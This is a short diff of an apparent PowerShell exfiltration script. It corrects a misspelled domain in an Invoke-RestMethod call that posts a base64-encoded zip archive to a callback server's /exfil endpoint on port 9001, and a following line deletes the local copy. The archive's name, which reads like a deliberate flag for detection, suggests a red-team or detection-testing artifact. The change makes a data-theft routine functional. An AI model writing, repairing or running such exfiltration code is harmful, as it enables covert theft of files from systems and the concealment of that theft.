@@ -7,5 +7,5 @@ $body = @{
     fileName = "exfil-clearlysomethingbad-flagthisforchristsakes.zip"
     content  = $base64File
 } | ConvertTo-Json
-Invoke-RestMethod -Uri 'http://callback.feemcotech.solutios:9001/exfil' -Method Post -Body $body -ContentType "application/json"
+Invoke-RestMethod -Uri 'http://callback.feemcotech.solutions:9001/exfil' -Method Post -Body $body -ContentType "application/json"
 Remove-Item -Path $Destination
